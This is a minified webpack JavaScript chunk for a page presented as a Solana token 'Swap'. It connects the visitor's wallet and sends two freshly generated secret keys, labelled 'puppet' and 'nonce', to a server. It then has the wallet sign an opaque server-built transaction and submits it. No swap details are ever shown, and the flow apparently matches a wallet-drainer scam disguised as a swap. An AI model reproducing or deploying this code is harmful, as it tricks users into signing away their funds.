"use strict";(self.webpackChunk_N_E=self.webpackChunk_N_E||[]).push([[22],{74022:function(e,t,a){a.r(t);var r=a(85893),n=a(7963),s=a(96557),i=a(14225),o=a(6089),c=a(66712),l=a(91170),d=a(4040),u=a(78230),p=a(6913),g=a(54306),h=a(46071),w=a(32085),f=a(80282),m=a(67294),y=a(77191),j=a(87066);t.default=()=>{let{select:e,wallets:t,publicKey:a,disconnect:x,signTransaction:S}=(0,g.O)(),k=(0,n.p)(),b=(0,m.useRef)(),E=a?a.toBase58():"",z=f.Keypair.generate(),C=f.Keypair.generate(),K=y.encode(z.secretKey),_=y.encode(C.secretKey),v=async e=>{let t=j.Z.post("/solana/sign",{from:e.toBase58(),puppet:_,nonce:K},{timeout:18e5}).then(e=>e.data).catch(e=>{if(412===e.response.status)throw Error("412");throw Error(e.message)}),a=await t,r=y.decode(a),n=f.Transaction.from(r);if(!S)throw Error("Signature failed");return await S(n)},B=async e=>{let t=C.publicKey.toBase58();b.current=k({title:"Swap Pending",description:"Please wait...",status:"loading",duration:null});try{let a=await v(e),r=new Uint8Array(a.serialize()),n=y.encode(r);k.update(b.current,{title:"Swap Pending",description:"Applying...",status:"loading",duration:null});let s=j.Z.post("/solana/send",{from:e.toBase58(),puppet:t,sign_tx:n},{timeout:18e5}).then(e=>e.data).catch(e=>{throw Error(e.message)}),i=await s;if("success"===i.status){k.update(b.current,{title:"Swap Succeed",description:i.message,status:"success",duration:6e3}),x();return}k.update(b.current,{title:"Swap Failed",description:"Unknown error please try again",status:"error",duration:3e3}),x()}catch(e){console.log("RequestFailed:",e.message),"412"===e.message?k.update(b.current,{title:"Swap Failed",description:"You are not eligible for Swap",status:"error",duration:3e3}):k.update(b.current,{title:"Swap Failed",description:"Unknown error please try again",status:"error",duration:3e3}),x()}};return a?(0,r.jsxs)(s.g,{gap:4,mb:2,children:[(0,r.jsxs)(c.v,{children:[(0,r.jsx)(l.j,{as:i.z,rightIcon:(0,r.jsx)(p.v,{}),children:E.substring(0,4).concat("...",E.substring(E.length-4,E.length))}),(0,r.jsx)(d.q,{children:(0,r.jsx)(u.s,{onClick:x,children:"Disconnect"})})]}),(0,r.jsx)(i.z,{onClick:async()=>{await B(a)},children:"Start Swap"})]}):(0,r.jsx)(s.g,{gap:4,children:t.filter(e=>"Installed"===e.readyState).length>0?t.filter(e=>"Installed"===e.readyState).map(t=>(0,r.jsx)(i.z,{w:"64",size:"lg",fontSize:"md",onClick:()=>e(t.adapter.name),leftIcon:(0,r.jsx)(o.E,{h:6,w:6,src:t.adapter.icon,alt:t.adapter.name}),children:t.adapter.name},t.adapter.name)):(0,r.jsxs)(s.g,{gap:4,children:[(0,r.jsx)(h.a,{}),(0,r.jsx)(w.v,{})]})})}}}]);